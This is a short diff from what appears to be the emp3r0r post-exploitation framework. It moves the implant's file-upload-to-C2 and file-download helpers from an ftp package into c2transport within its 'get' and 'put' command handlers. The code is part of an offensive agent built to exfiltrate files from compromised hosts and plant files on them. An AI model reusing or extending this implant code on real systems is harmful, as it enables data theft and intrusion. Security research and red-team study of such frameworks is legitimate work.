@@ -8,7 +8,6 @@ import (
 	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/ftp"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/spf13/cobra"
@@ -58,7 +57,7 @@ func getCmdRun(cmd *cobra.Command, args []string) {
 	}
 
 	// Single file: send file via existing helper.
-	err := ftp.SendFile2CC(filePath, offset, token)
+	err := c2transport.SendFile2CC(filePath, offset, token)
 	if err != nil {
 		c2transport.C2RespPrintf(cmd, "%s", fmt.Sprintf("Error: failed to send file %s: %v", filePath, err))
 		return
@@ -78,7 +77,7 @@ func putCmdRun(cmd *cobra.Command, args []string) {
 		c2transport.C2RespPrintf(cmd, "%s", fmt.Sprintf("args error: %v", args))
 		return
 	}
-	_, err := ftp.SmartDownload(downloadAddr, fileName, destPath, origChecksum)
+	_, err := c2transport.SmartDownload(downloadAddr, fileName, destPath, origChecksum)
 	if err != nil {
 		c2transport.C2RespPrintf(cmd, "%s", fmt.Sprintf("put: failed to download %s: %v", fileName, err))
 		return
